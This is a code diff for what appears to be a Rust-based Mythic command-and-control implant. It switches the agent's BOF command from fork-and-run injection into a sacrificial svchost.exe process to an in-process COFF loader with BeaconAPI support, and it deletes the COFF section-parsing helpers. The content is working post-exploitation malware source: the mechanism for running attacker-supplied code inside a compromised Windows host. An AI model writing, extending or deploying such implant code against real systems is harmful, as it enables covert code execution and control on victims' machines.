@@ -269,7 +269,7 @@ pub fn fork_and_run(
 }
 
 // ============================================================================
-// BOF COMMAND — now uses fork-and-run (agent-safe)
+// BOF COMMAND — in-process COFF loader with BeaconAPI
 // ============================================================================
 
 #[cfg(target_os = "windows")]
@@ -289,37 +289,15 @@ pub fn bof(
 
     let bof_size = file_data.len();
 
-    // Parse COFF to extract .text section
-    let text_offset = match find_coff_text_section(&file_data) {
-        Some(offset) => offset,
-        None => {
-            tx.send(mythic_error!(task.id, format!(
-                "BOF ({} bytes): invalid COFF - could not find .text section",
-                bof_size
-            )))?;
-            return Ok(());
-        }
-    };
-
-    // Get .text section size from section header
-    let text_size = get_coff_text_size(&file_data, text_offset).unwrap_or(file_data.len() - text_offset);
-    let text_end = (text_offset + text_size).min(file_data.len());
-    let text_data = &file_data[text_offset..text_end];
-
-    if text_data.is_empty() {
-        tx.send(mythic_error!(task.id, "BOF .text section is empty"))?;
-        return Ok(());
-    }
-
-    // Execute via fork-and-run (sacrificial process — agent-safe)
-    let result = unsafe { fork_and_run_impl(text_data, "C:\\Windows\\System32\\svchost.exe", 30) };
+    // Execute via in-process COFF loader with BeaconAPI support
+    let result = crate::coffloader::run_bof(&file_data, arguments.as_bytes());
 
     match result {
         Ok(output) => tx.send(mythic_success!(task.id, format!(
-            "BOF executed ({} bytes, .text {} bytes) via fork-and-run\n\n{}",
-            bof_size, text_data.len(), output
+            "BOF executed ({} bytes)\n\n{}",
+            bof_size, output
         )))?,
-        Err(e) => tx.send(mythic_error!(task.id, format!("BOF fork-and-run failed: {}", e)))?,
+        Err(e) => tx.send(mythic_error!(task.id, format!("BOF execution failed: {}", e)))?,
     }
     Ok(())
 }
@@ -399,66 +377,4 @@ pub fn execute_assembly(
     let task: AgentTask = serde_json::from_value(rx.recv()?)?;
     tx.send(mythic_error!(task.id, "execute_assembly requires Windows"))?;
     Ok(())
-}
-
-// ============================================================================
-// COFF PARSER HELPERS
-// ============================================================================
-
-#[cfg(target_os = "windows")]
-fn find_coff_text_section(data: &[u8]) -> Option<usize> {
-    if data.len() < 20 { return None; }
-
-    let machine = u16::from_le_bytes([data[0], data[1]]);
-    if machine != 0x8664 && machine != 0x014C { return None; }
-
-    let num_sections = u16::from_le_bytes([data[2], data[3]]) as usize;
-    if num_sections == 0 || num_sections > 96 { return None; }
-
-    let opt_hdr_size = u16::from_le_bytes([data[16], data[17]]) as usize;
-    let sec_table = 20usize.saturating_add(opt_hdr_size);
-    let required = sec_table.saturating_add(num_sections.saturating_mul(40));
-    if data.len() < required { return None; }
-
-    for i in 0..num_sections {
-        let off = sec_table + (i * 40);
-        let name = &data[off..off + 8];
-        let raw_ptr = u32::from_le_bytes([data[off+20], data[off+21], data[off+22], data[off+23]]) as usize;
-
-        if name.starts_with(b".text\0") && raw_ptr > 0 && raw_ptr < data.len() {
-            return Some(raw_ptr);
-        }
-    }
-
-    // Fallback: first executable section
-    for i in 0..num_sections {
-        let off = sec_table + (i * 40);
-        let chars = u32::from_le_bytes([data[off+36], data[off+37], data[off+38], data[off+39]]);
-        let raw_ptr = u32::from_le_bytes([data[off+20], data[off+21], data[off+22], data[off+23]]) as usize;
-
-        if (chars & 0x20000020) != 0 && raw_ptr > 0 && raw_ptr < data.len() {
-            return Some(raw_ptr);
-        }
-    }
-    None
-}
-
-#[cfg(target_os = "windows")]
-fn get_coff_text_size(data: &[u8], text_offset: usize) -> Option<usize> {
-    if data.len() < 20 { return None; }
-
-    let num_sections = u16::from_le_bytes([data[2], data[3]]) as usize;
-    let opt_hdr_size = u16::from_le_bytes([data[16], data[17]]) as usize;
-    let sec_table = 20 + opt_hdr_size;
-
-    for i in 0..num_sections {
-        let off = sec_table + (i * 40);
-        if off + 24 > data.len() { break; }
-        let raw_ptr = u32::from_le_bytes([data[off+20], data[off+21], data[off+22], data[off+23]]) as usize;
-        if raw_ptr == text_offset {
-            let size = u32::from_le_bytes([data[off+16], data[off+17], data[off+18], data[off+19]]) as usize;
-            return Some(size);
-        }
-    }
-    None
 }
